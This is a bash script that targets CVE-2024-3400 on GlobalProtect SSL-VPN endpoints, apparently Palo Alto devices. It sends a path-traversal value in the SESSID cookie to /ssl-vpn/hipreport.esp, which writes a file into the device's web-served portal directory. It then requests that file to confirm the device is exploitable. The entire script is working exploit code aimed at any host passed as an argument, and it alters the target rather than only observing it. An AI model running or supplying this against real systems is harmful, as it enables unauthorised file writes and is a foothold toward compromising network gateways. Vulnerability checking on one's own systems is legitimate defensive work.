#!/bin/bash
#chmod +x CVE-2024-3400.sh
#./CVE-2024-3400.sh target
#sh CVE-2024-3400.sh target

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


# First Create 0-Byte File
response=$(curl -X POST -vkL -sS -o /dev/null -w "%{http_code}" $1/ssl-vpn/hipreport.esp -H "Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/CVE20243400.txt;" --data "CVE20243400.txt" )
if [ $response -eq 200 ]; then
    echo "${GREEN}0-Byte File CREATED${NC}"
else
    echo -e "${RED}Failed with status code: $response ${NC}"
    exit 1
fi

# Second Verify 0-Byte File
response=$(curl -vkL -sS -o /dev/null -w "%{http_code}" $1/global-protect/portal/images/CVE20243400.txt)
if [ $response -eq 403 ]; then
    echo "${GREEN}SERVER VULNERABLE${NC}"
elif [ $response -eq 200 ]; then
    echo "${RED}Failed with status code: $response ${NC}"
fi

